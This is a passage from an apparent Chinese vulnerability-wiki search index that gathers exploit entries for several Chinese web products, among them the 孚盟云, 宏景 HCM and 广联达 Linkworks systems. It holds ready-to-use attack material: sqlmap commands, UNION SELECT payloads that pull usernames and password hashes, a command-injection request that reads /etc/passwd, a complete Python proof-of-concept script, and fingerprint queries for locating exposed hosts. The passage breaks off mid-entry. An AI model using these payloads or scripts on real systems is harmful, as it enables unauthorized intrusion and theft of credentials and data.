","date":"0001-01-01","objectID":"/%E5%AD%9A%E7%9B%9F%E4%BA%91-ajaxmethod.ashx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%AD%9A%E7%9B%9F%E4%BA%91-ajaxmethod.ashx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"孚盟云 \" ","date":"0001-01-01","objectID":"/%E5%AD%9A%E7%9B%9F%E4%BA%91-ajaxmethod.ashx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%AD%9A%E7%9B%9F%E4%BA%91-ajaxmethod.ashx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC http://xxx.xxx.xxx.xxx/Ajax/AjaxMethod.ashx?action=getEmpByname\u0026Name=Y%27 使用Sqlmap sqlmap -u \"http://xxx.xxx.xxx.xxx/Ajax/AjaxMethod.ashx?action=getEmpByname\u0026Name=Y\" -p Name --batch --random-agent --dbms mssql --dbs ","date":"0001-01-01","objectID":"/%E5%AD%9A%E7%9B%9F%E4%BA%91-ajaxmethod.ashx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%AD%9A%E7%9B%9F%E4%BA%91-ajaxmethod.ashx-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"安天 高级可持续威胁安全检测系统 越权访问漏洞 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%A4%A9-%E9%AB%98%E7%BA%A7%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%AE%89%E5%A4%A9-%E9%AB%98%E7%BA%A7%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 安天 高级可持续威胁安全检测系统 存在越权访问漏洞，攻击者可以通过工具修改特定的返回包导致越权后台查看敏感信息 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%A4%A9-%E9%AB%98%E7%BA%A7%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%AE%89%E5%A4%A9-%E9%AB%98%E7%BA%A7%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 安天 高级可持续威胁安全检测系统 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%A4%A9-%E9%AB%98%E7%BA%A7%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%AE%89%E5%A4%A9-%E9%AB%98%E7%BA%A7%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"高级可持续威胁安全检测系统\" ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%A4%A9-%E9%AB%98%E7%BA%A7%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%AE%89%E5%A4%A9-%E9%AB%98%E7%BA%A7%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 其中抓包过程中发现请求的一个身份验证 Url {\"role\": \"\", \"login_status\": false, \"result\": \"ok\"} 其中 login_status 为 false, 将参数使用 Burp 替换响应包为 true 请求 /api/user/islogin 时成功越过身份验证 再次访问首页验证越权漏洞 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%A4%A9-%E9%AB%98%E7%BA%A7%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%AE%89%E5%A4%A9-%E9%AB%98%E7%BA%A7%E5%8F%AF%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"安徽阳光心健 心理测量平台 目录遍历漏洞 CNVD-2021-01929 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%BE%BD%E9%98%B3%E5%85%89%E5%BF%83%E5%81%A5-%E5%BF%83%E7%90%86%E6%B5%8B%E9%87%8F%E5%B9%B3%E5%8F%B0-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cnvd-2021-01929/:0:0","tags":null,"title":"","uri":"/%E5%AE%89%E5%BE%BD%E9%98%B3%E5%85%89%E5%BF%83%E5%81%A5-%E5%BF%83%E7%90%86%E6%B5%8B%E9%87%8F%E5%B9%B3%E5%8F%B0-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cnvd-2021-01929/"},{"categories":null,"content":"漏洞描述 安徽阳光心健心理咨询有限公司心理测量平台存在目录遍历漏洞，攻击者可利用该漏洞获取敏感信息。 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%BE%BD%E9%98%B3%E5%85%89%E5%BF%83%E5%81%A5-%E5%BF%83%E7%90%86%E6%B5%8B%E9%87%8F%E5%B9%B3%E5%8F%B0-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cnvd-2021-01929/:1:0","tags":null,"title":"","uri":"/%E5%AE%89%E5%BE%BD%E9%98%B3%E5%85%89%E5%BF%83%E5%81%A5-%E5%BF%83%E7%90%86%E6%B5%8B%E9%87%8F%E5%B9%B3%E5%8F%B0-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cnvd-2021-01929/"},{"categories":null,"content":"漏洞影响 安徽阳光心健 心理测量平台 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%BE%BD%E9%98%B3%E5%85%89%E5%BF%83%E5%81%A5-%E5%BF%83%E7%90%86%E6%B5%8B%E9%87%8F%E5%B9%B3%E5%8F%B0-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cnvd-2021-01929/:2:0","tags":null,"title":"","uri":"/%E5%AE%89%E5%BE%BD%E9%98%B3%E5%85%89%E5%BF%83%E5%81%A5-%E5%BF%83%E7%90%86%E6%B5%8B%E9%87%8F%E5%B9%B3%E5%8F%B0-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cnvd-2021-01929/"},{"categories":null,"content":"网络测绘 icon_hash=\"-320896955\" ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%BE%BD%E9%98%B3%E5%85%89%E5%BF%83%E5%81%A5-%E5%BF%83%E7%90%86%E6%B5%8B%E9%87%8F%E5%B9%B3%E5%8F%B0-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cnvd-2021-01929/:3:0","tags":null,"title":"","uri":"/%E5%AE%89%E5%BE%BD%E9%98%B3%E5%85%89%E5%BF%83%E5%81%A5-%E5%BF%83%E7%90%86%E6%B5%8B%E9%87%8F%E5%B9%B3%E5%8F%B0-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cnvd-2021-01929/"},{"categories":null,"content":"漏洞复现 主页如下 扫描目录 访问 http://xxx.xxx.xxx.xxx/admin/ 其中 http://xxx.xxx.xxx.xxx/admin/UserFiles/ 中还包含了用户信息可未授权下载 ","date":"0001-01-01","objectID":"/%E5%AE%89%E5%BE%BD%E9%98%B3%E5%85%89%E5%BF%83%E5%81%A5-%E5%BF%83%E7%90%86%E6%B5%8B%E9%87%8F%E5%B9%B3%E5%8F%B0-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cnvd-2021-01929/:4:0","tags":null,"title":"","uri":"/%E5%AE%89%E5%BE%BD%E9%98%B3%E5%85%89%E5%BF%83%E5%81%A5-%E5%BF%83%E7%90%86%E6%B5%8B%E9%87%8F%E5%B9%B3%E5%8F%B0-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E-cnvd-2021-01929/"},{"categories":null,"content":"安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞 漏洞描述 安美数字 酒店宽带运营系统 server_ping.php 存在远程命令执行漏洞，漏洞文件中ip参数未过滤造成命令执行 ","date":"0001-01-01","objectID":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97-%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F-server_ping.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97-%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F-server_ping.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 安美数字 酒店宽带运营系统 ","date":"0001-01-01","objectID":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97-%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F-server_ping.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97-%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F-server_ping.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"酒店宽带运营\" ","date":"0001-01-01","objectID":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97-%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F-server_ping.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97-%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F-server_ping.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 存在漏洞的文件为 server_ping.php \u003c? if (!isset($ip) || $ip == \"\" || !isset($id) || $id == \"\") exit; $cmd = \"ping -c 2 -s 65 $ip\"; $fp = popen($cmd, \"r\"); $getString = \"\"; if ($fp) { while (($line = fgets($fp, 512))) { $getString .= trim($line); } pclose($fp); } if (strstr($getString, \"2 received, 0%\")) { echo \"\u003chtml\u003e\u003cbody\u003e\u003cscript language=\\\"javascript\\\"\u003e\\n\"; echo \"parent.doTestResult('$id', 'ok');\\n\"; echo \"\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e\\n\"; } else { echo \"\u003chtml\u003e\u003cbody\u003e\u003cscript language=\\\"javascript\\\"\u003e\\n\"; echo \"parent.doTestResult('$id', 'no');\\n\"; echo \"\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e\\n\"; } ?\u003e 漏洞位置为 $cmd = \"ping -c 2 -s 65 $ip\"; $fp = popen($cmd, \"r\"); GET传入 $ip参数 后直接命令执行，并且文件无权限要求 请求包为 GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd\u003e../../test.txt\u0026id=1 HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 ","date":"0001-01-01","objectID":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97-%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F-server_ping.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97-%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F-server_ping.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd\u003e../../test.txt\u0026id=1\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] 正在执行 cat /etc/passwd\u003e../../test.txt \\033[0m\".format(target_url)) if \"parent\" in response.text and response.status_code == 200: vuln_url = target_url + \"/test.txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10) if \"root:\" in response.text: print(\"\\033[36m[o] 成功执行 cat /etc/passwd, 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 请求失败:{} \\033[0m\") else: print(\"\\033[31m[x] 请求失败 \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97-%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F-server_ping.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97-%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F-server_ping.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"宏景 HCM codesettree SQL注入漏洞 CNVD-2023-0874 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E6%99%AF-hcm-codesettree-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2023-0874/:0:0","tags":null,"title":"","uri":"/%E5%AE%8F%E6%99%AF-hcm-codesettree-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2023-0874/"},{"categories":null,"content":"漏洞描述 宏景 HCM codesettree 接口存在SQL注入漏洞，攻击者通过漏洞可以获取到登陆系统的账号密码和数据库信息 ","date":"0001-01-01","objectID":"/%E5%AE%8F%E6%99%AF-hcm-codesettree-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2023-0874/:1:0","tags":null,"title":"","uri":"/%E5%AE%8F%E6%99%AF-hcm-codesettree-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2023-0874/"},{"categories":null,"content":"漏洞影响 宏景 HCM ","date":"0001-01-01","objectID":"/%E5%AE%8F%E6%99%AF-hcm-codesettree-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2023-0874/:2:0","tags":null,"title":"","uri":"/%E5%AE%8F%E6%99%AF-hcm-codesettree-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2023-0874/"},{"categories":null,"content":"网络测绘 app=\"HJSOFT-HCM\" ","date":"0001-01-01","objectID":"/%E5%AE%8F%E6%99%AF-hcm-codesettree-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2023-0874/:3:0","tags":null,"title":"","uri":"/%E5%AE%8F%E6%99%AF-hcm-codesettree-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2023-0874/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /servlet/codesettree?flag=c\u0026status=1\u0026codesetid=1\u0026parentid=-1\u0026categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d /servlet/codesettree?flag=c\u0026status=1\u0026codesetid=1\u0026parentid=-1\u0026categories=~31~27~20union~20all~20select~20~27~31~27~2cpassword~20from~20operuser~20~2d~2d ","date":"0001-01-01","objectID":"/%E5%AE%8F%E6%99%AF-hcm-codesettree-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2023-0874/:4:0","tags":null,"title":"","uri":"/%E5%AE%8F%E6%99%AF-hcm-codesettree-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2023-0874/"},{"categories":null,"content":"宝塔 phpmyadmin未授权访问漏洞 ","date":"0001-01-01","objectID":"/%E5%AE%9D%E5%A1%94-phpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%AE%9D%E5%A1%94-phpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 【宝塔面板】紧急安全更新通知，Linux面板7.4.2版本/Windows面板6.8版本存在安全隐患，其他版本无此风险。已发布紧急更新，请所有使用此版本的用户务必升级到最新版，更新方法，登录面板直接升级更新即可，如更新出现问题，请登录宝塔论坛反馈或者联系客服反馈 ","date":"0001-01-01","objectID":"/%E5%AE%9D%E5%A1%94-phpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%AE%9D%E5%A1%94-phpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Linux正式版7.4.2 Linux测试版7.5.13 Windows正式版6.8 ","date":"0001-01-01","objectID":"/%E5%AE%9D%E5%A1%94-phpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%AE%9D%E5%A1%94-phpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问 http://xxx.xxx.xxx.xxx:888/pma 即可 ","date":"0001-01-01","objectID":"/%E5%AE%9D%E5%A1%94-phpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%AE%9D%E5%A1%94-phpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"广联达 Linkworks GetIMDictionary SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-getimdictionary-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-getimdictionary-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 广联达 Linkworks办公OA GetIMDictionary接口存在SQL注入漏洞，发送请求包后可以获取数据库中的敏感信息 ","date":"0001-01-01","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-getimdictionary-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-getimdictionary-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 广联达 Linkworks ","date":"0001-01-01","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-getimdictionary-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-getimdictionary-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 web.body=\"/Services/Identification/\" ","date":"0001-01-01","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-getimdictionary-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-getimdictionary-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 // GTP.IM.Services.Config.WebSite.WebService.IM.Config.ConfigService // Token: 0x06000018 RID: 24 RVA: 0x00004148 File Offset: 0x00002348 [WebMethod(Description = \"得到IM系统配置\")] public string GetIMDictionary(string key) { string str = string.Empty; ISysConfigService service = ServiceFactory.GetService\u003cISysConfigService\u003e(); StringBuilder stringBuilder = new StringBuilder(); stringBuilder.AppendFormat(\"select F_VALUE from T_IM_DICTIONARY where f_key='{0}';\", key); DataSet dataSet = GSqlDataAccess.SelectDataSet(service.DataSourceName, stringBuilder.ToString(), new DataParameter[0]); if (dataSet != null \u0026\u0026 dataSet.Tables.Count \u003e 0 \u0026\u0026 dataSet.Tables[0] != null) { foreach (object obj in dataSet.Tables[0].Rows) { DataRow dataRow = (DataRow)obj; str = dataRow[\"F_VALUE\"].ToString(); } } StringBuilder stringBuilder2 = new StringBuilder(); stringBuilder2.Append(\"\u003c?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\"?\u003e\"); stringBuilder2.Append(\"\u003cresult value=\\\"\" + str + \"\\\" \u003e\"); stringBuilder2.Append(\"\u003c/result\u003e\"); return stringBuilder2.ToString(); } 验证POC POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER -- ","date":"0001-01-01","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-getimdictionary-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-getimdictionary-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"广联达 Linkworks msgbroadcastuploadfile.aspx 后台文件上传漏洞 ","date":"0001-01-01","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-msgbroadcastuploadfile.aspx-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-msgbroadcastuploadfile.aspx-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 广联达 Linkworks msgbroadcastuploadfile.aspx 存在后台文件上传漏洞，攻击者通过SQL注入获取管理员信息后，可以登陆发送请求包获取服务器权限 ","date":"0001-01-01","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-msgbroadcastuploadfile.aspx-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-msgbroadcastuploadfile.aspx-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 广联达 Linkworks ","date":"0001-01-01","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-msgbroadcastuploadfile.aspx-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-msgbroadcastuploadfile.aspx-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 web.body=\"/Services/Identification/\" ","date":"0001-01-01","objectID":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-msgbroadcastuploadfile.aspx-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-msgbroadcastuploadfile.aspx-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 GTP.IM.Services.Group.WebSite.GTP.IM.Services.Group 存在文件上传，上传后在当前目录 Upload下 通过SQL注入获取管理员账号密码后登陆后台上传文件,验证POC POST 